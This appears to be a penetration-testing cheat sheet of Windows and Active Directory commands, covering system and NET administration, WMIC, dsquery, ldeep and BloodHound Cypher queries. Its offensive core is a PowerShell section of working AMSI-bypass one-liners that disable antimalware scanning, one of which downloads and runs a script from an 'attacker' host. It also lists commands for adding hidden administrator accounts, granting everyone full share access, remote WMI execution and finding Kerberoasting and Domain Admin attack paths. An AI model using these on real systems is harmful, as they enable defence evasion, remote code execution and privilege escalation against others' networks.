# System Commands

_8 tool commands_

### Windows CMD Commands  `windows-cmd`
_Common Windows system commands_

**Step 0**
> Get system information
_platform: windows_
```
systeminfo
ver
hostname
```

**Step 0**
> User management commands
_platform: windows_
```
net user
net user username password /add
net localgroup administrators username /add
```

**Step 0**
> Network configuration information
_platform: windows_
```
ipconfig /all
netstat -ano
netstat -anob
route print
arp -a
```

**Step 0**
> Process management commands
_platform: windows_
```
tasklist
taskkill /PID pid /F
wmic process list full
```

**Step 0**
> Service management commands
_platform: windows_
```
sc query
sc start servicename
sc stop servicename
net start
```

**Step 0**
> File operation commands
_platform: windows_
```
dir /s /b c:\*.txt
type filename
find "string" filename
icacls filename
```

**Step 0**
> Registry operations
_platform: windows_
```
reg query HKLM\Software
reg add HKLM\Software\MyKey /v Value /t REG_SZ /d "Data" /f
reg delete HKLM\Software\MyKey /f
```

**Step 0**
> Firewall configuration
_platform: windows_
```
netsh advfirewall show allprofiles
netsh advfirewall firewall add rule name="Allow Port" dir=in action=allow protocol=tcp localport=8080
```

---

### NET Command Collection  `net-commands`
_Complete collection of Windows NET commands_

**Step 0**
> List all users
_platform: windows_
```
net user
```

**Step 0**
> View detailed user information
_platform: windows_
```
net user username
```

**Step 0**
> Add a new user
_platform: windows_
```
net user username password /add
```

**Step 0**
> Delete a user
_platform: windows_
```
net user username /delete
```

**Step 0**
> List all local groups
_platform: windows_
```
net localgroup
```

**Step 0**
> Add a user to the administrators group
_platform: windows_
```
net localgroup administrators username /add
```

**Step 0**
> List domain users
_platform: windows_
```
net user /domain
```

**Step 0**
> List domain administrators
_platform: windows_
```
net group "Domain Admins" /domain
```

**Step 0**
> List shared resources
_platform: windows_
```
net share
```

**Step 0**
> Create a share
_platform: windows_
```
net share sharename=C:\path /grant:everyone,full
```

**Step 0**
> List current sessions
_platform: windows_
```
net session
```

**Step 0**
> Connect to a network share
_platform: windows_
```
net use \\target\share password /user:domain\user
```

---

### PowerShell AMSI Bypass  `powershell-amsi`
_Collection of Windows AMSI (Antimalware Scan Interface) bypass techniques_

**Step 0**
> Modify the amsiInitFailed flag via reflection
_platform: windows_
```
[Ref].Assembly.GetType('System.Management.Automation.AmsiUtils').GetField('amsiInitFailed','NonPublic,Static').SetValue($null,$true)
```

**Step 0**
> Bypass AMSI signature detection via string concatenation
_platform: windows_
```
$a=[Ref].Assembly.GetType('System.Management.Automation.Am'+'siUt'+'ils');$b=$a.GetField('am'+'siIn'+'itFa'+'iled','NonPublic,Static');$b.SetValue($null,$true)
```

**Step 0**
> Directly modify the AMSI buffer in memory
_platform: windows_
```
$w='System.Management.Automation.A'+'msiUtils';[Runtime.InteropServices.Marshal]::WriteByte(([Ref].Assembly.GetType($w).GetField('a'+'msiSession',[Reflection.BindingFlags]'NonPublic,Static').GetValue($null)),0x80)
```

**Step 0**
> Run a script using PowerShell v2 (no AMSI)
_platform: windows_
```
powershell -version 2 -command "IEX (New-Object Net.WebClient).DownloadString('http://attacker/script.ps1')"
```

---

### WMIC Commands  `wmic-cmd`
_Windows Management Instrumentation command-line tool_

**Step 0**
> Get operating system and computer information
_platform: windows_
```
wmic os get Caption,Version,BuildNumber,OSArchitecture
wmic computersystem get Name,Domain,Manufacturer,Model
```
**Syntax breakdown:**
- `wmic` — WMI command-line tool _command_
- `os get` — Query operating system object properties _parameter_

**Step 0**
> Query and create processes
_platform: windows_
```
wmic process list brief
wmic process where name="cmd.exe" get processid,commandline
wmic process call create "cmd.exe /c whoami > C:\temp\out.txt"
```

**Step 0**
> Query service information
_platform: windows_
```
wmic service list brief
wmic service where "startmode='auto' and state='stopped'" get name,startname
```

**Step 0**
> Remote WMI command execution
_platform: windows_
```
wmic /node:target_ip /user:admin /password:pass process call create "cmd.exe /c whoami"
```

**Step 0**
> List installed software and patches
_platform: windows_
```
wmic product get name,version
wmic qfe list
```

---

### DSQuery Commands  `dsquery`
_Active Directory query command-line tool_

**Step 0**
> Query domain users (all/administrators/inactive)
_platform: windows_
```
dsquery user -limit 0
dsquery user -name *admin*
dsquery user -inactive 4
```
**Syntax breakdown:**
- `dsquery user` — Query AD user objects _command_
- `-limit 0` — Do not limit the number of returned results _parameter_

**Step 0**
> Query computer objects in the domain
_platform: windows_
```
dsquery computer -limit 0
dsquery computer -name *server*
```

**Step 0**
> Query domain groups and members
_platform: windows_
```
dsquery group -name "Domain Admins"
dsquery group | dsget group -members
```

**Step 0**
> Query organizational unit structure
_platform: windows_
```
dsquery ou
dsquery * "DC=domain,DC=com" -filter "(objectclass=organizationalUnit)" -attr name
```

**Step 0**
> Custom LDAP filter to query privileged users
_platform: windows_
```
dsquery * -filter "(&(objectClass=user)(adminCount=1))" -attr sAMAccountName -limit 0
```

---

### AD Explorer  `adexplorer`
_Active Directory browser and snapshot tool from Sysinternals_

**Step 0**
> Connect to Active Directory to browse
_platform: windows_
```
ADExplorer.exe
# Enter DC address: dc.domain.com
# Enter credentials: domain\user / password
# Or connect directly using current domain credentials
```

**Step 0**
> Create an offline snapshot of the AD database (analyzable with BloodHound)
_platform: windows_
```
ADExplorer.exe -snapshot "" output.snp
# Or in the GUI: File > Create Snapshot
```

**Step 0**
> Compare two snapshots to discover AD changes
_platform: windows_
```
# GUI operation: File > Compare
# Select snapshot files from two points in time
# Compare AD changes (new users / permission changes, etc.)
```

---

### ldeep  `ldeep`
_LDAP deep enumeration tool for remotely querying AD information from Linux_

**Step 0**
> Enumerate domain users
```
ldeep ldap -u user -p password -d domain.com -s dc_ip users
ldeep ldap -u user -p password -d domain.com -s dc_ip users -v
```
**Syntax breakdown:**
- `ldap` — Connect using the LDAP protocol _parameter_
- `-s` — LDAP server address _parameter_

**Step 0**
> Enumerate groups and group policy objects
```
ldeep ldap -u user -p pass -d domain.com -s dc_ip groups
ldeep ldap -u user -p pass -d domain.com -s dc_ip gpo
```

**Step 0**
> Query delegation configurations and domain trust relationships
```
ldeep ldap -u user -p pass -d domain.com -s dc_ip delegations
ldeep ldap -u user -p pass -d domain.com -s dc_ip trusts
```

**Step 0**
> Query password policies
```
ldeep ldap -u user -p pass -d domain.com -s dc_ip pso
ldeep ldap -u user -p pass -d domain.com -s dc_ip pass-pols
```

---

### BloodHound Cypher  `bloodhound-cypher`
_Collection of BloodHound Neo4j Cypher queries_

**Step 0**
> Find the shortest attack path from a specified user to Domain Admin
```
MATCH p=shortestPath((n:User {name:"USER@DOMAIN.COM"})-[*1..]->(m:Group {name:"DOMAIN ADMINS@DOMAIN.COM"})) RETURN p
```

**Step 0**
> Find users vulnerable to Kerberoasting
```
MATCH (u:User {hasspn:true}) WHERE NOT u.name STARTS WITH "KRBTGT" RETURN u.name, u.serviceprincipalnames
```

**Step 0**
> Find users vulnerable to AS-REP Roasting
```
MATCH (u:User {dontreqpreauth:true}) RETURN u.name
```

**Step 0**
> Find all users with local administrator privileges
```
MATCH p=(u:User)-[:AdminTo]->(c:Computer) RETURN u.name, c.name
```

**Step 0**
> Find computers configured with unconstrained delegation
```
MATCH (c:Computer {unconstraineddelegation:true}) RETURN c.name
```

**Step 0**
> Find exploitable ACL permission relationships
```
MATCH p=(u:User)-[:GenericAll|GenericWrite|WriteDacl|WriteOwner|ForceChangePassword*1..]->(target) WHERE NOT u.name STARTS WITH "KRBTGT" RETURN p
```

---
